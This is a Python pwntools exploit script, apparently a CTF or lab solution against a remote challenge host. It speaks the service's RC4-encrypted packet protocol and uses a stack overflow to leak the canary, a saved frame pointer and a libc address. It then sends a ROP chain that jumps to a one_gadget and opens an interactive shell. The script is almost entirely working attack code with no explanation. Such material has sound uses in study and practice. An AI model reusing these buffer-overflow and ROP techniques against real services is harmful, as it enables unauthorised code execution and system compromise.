from pwn import *
import struct
import time


ip = "bbd44d8c6224.target.yijinglab.com"
port = 59635
filename = "./pwn"
elf = ELF(filename)
libc = ELF("./lib/x86_64-linux-gnu/libc.so.6")
context.binary = elf

ru = lambda a: p.recvuntil(a)
r = lambda: p.recv()
sla = lambda a, b: p.sendlineafter(a, b)
sa = lambda a, b: p.sendafter(a, b)
sl = lambda a: p.sendline(a)
s = lambda a: p.send(a)
itob = lambda a: str(a).encode("l1")


def generatecmd(cmd, code):
    res = b""
    res += b"\xaa\xaa\xc0"
    res += cmd
    res += code
    return res


def rc4_keystream(key: bytes, length: int):
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) & 0xFF
        S[i], S[j] = S[j], S[i]
    i = j = 0
    stream = []
    for _ in range(length):
        i = (i + 1) & 0xFF
        j = (j + S[i]) & 0xFF
        S[i], S[j] = S[j], S[i]
        K = S[(S[i] + S[j]) & 0xFF]
        stream.append(K)
    return stream


# 用法
key = b"goitifyouwantit"
keystream = rc4_keystream(key, 10000)


def descrypt(leak):
    return bytes([leak[i] ^ keystream[i] for i in range(len(leak))])


def gen_no_null_bytes(length: int):
    # 只用"a"和"b"拼接，优先用"a"
    result = bytearray()
    for i in range(length):
        # 先尝试用"a"
        c = ord("a")
        if (c ^ keystream[i]) == 0:
            c = ord("b")
            if (c ^ keystream[i]) == 0:
                raise ValueError(f"位置{i}无法避免\x00")
        result.append(c)
    return bytes(result)


def rc4_encrypt_and_escape(plaintext: bytes, keystream: list) -> bytes:
    out = bytearray()
    for i, b in enumerate(plaintext):
        c = b ^ keystream[i]
        if c == 0x00:
            out += b"\xaa\x20"
        elif c == 0xAA:
            out += b"\xaa\x8a"
        else:
            out.append(c)
    out.append(0x00)  # 结束符
    return bytes(out)


def pwn():
    payload1 = generatecmd(b"\xcc", gen_no_null_bytes(0x630 - 0x18) + b"b" + b"\x00")
    p.send(payload1)
    payload2 = generatecmd(b"\xdd", b"")
    p.send(payload2)
    p.send(payload2)
    p.recvuntil(b"\xaa\xaa\xc0\xcc")
    leak = p.recvuntil(b"\xaa\xaa\xc0\xcc", True)
    print(descrypt(leak))
    m = descrypt(leak)
    canary = u64(b"\x00" + m[0x630 - 0x17 : 0x630 - 0x10])
    print(f"canary: {hex(canary)}")
    payload = generatecmd(b"\xcc", gen_no_null_bytes(0x630) + b"\x00")
    p.send(payload)
    p.send(payload2)
    p.send(payload2)
    p.recvuntil(b"\xaa\xaa\xc0\xcc")
    leak1 = p.recvuntil(b"\xaa\xaa\xc0\xcc", True)
    m1 = descrypt(leak1)
    leak_addr = u64(m1[0x630 : 0x630 + 6].ljust(8, b"\x00"))
    rbp_addr = leak_addr
    print(f"leak_rbp_addr: {hex(leak_addr)}")
    payload3 = generatecmd(b"\xcc", gen_no_null_bytes(0x630 + 0x10 + 0x28) + b"\x00")
    p.send(payload3)
    p.send(payload2)
    p.send(payload2)
    p.recvuntil(b"\xaa\xaa\xc0\xcc")
    leak2 = p.recvuntil(b"\xaa\xaa\xc0\xcc", True)
    m2 = descrypt(leak2)
    leak_addr = u64(m2[0x630 + 0x10 + 0x28 : 0x630 + 0x16 + 0x28].ljust(8, b"\x00"))
    libc_addr = leak_addr - (0x7B65D2C29D90 - 0x7B65D2C00000)
    print(f"leak_libc_addr: {hex(leak_addr)}")
    print(f"libc_addr: {hex(libc_addr)}")
    libc.address = libc_addr
    one_gadget = libc.address + 0xEBD43
    gadget_ret = 0x00000000000BAAF9 + libc.address
    # 0x00000000000baaf9 : xor rax, rax ; ret
    # rbp_offset 0x630
    plaintext = (
        b"\x00" * (0x630 - 0x18)
        + p64(canary)
        + b"a" * 0x10
        + p64(rbp_addr)
        + p64(gadget_ret)
        + p64(one_gadget)
    )
    ciphertext = rc4_encrypt_and_escape(plaintext, keystream)
    payload4 = generatecmd(b"\xcc", ciphertext)
    p.send(payload4)
    p.send(generatecmd(b"\x12", b""))
    p.interactive()


if __name__ == "__main__":
    p = remote(ip, port)
    pwn()
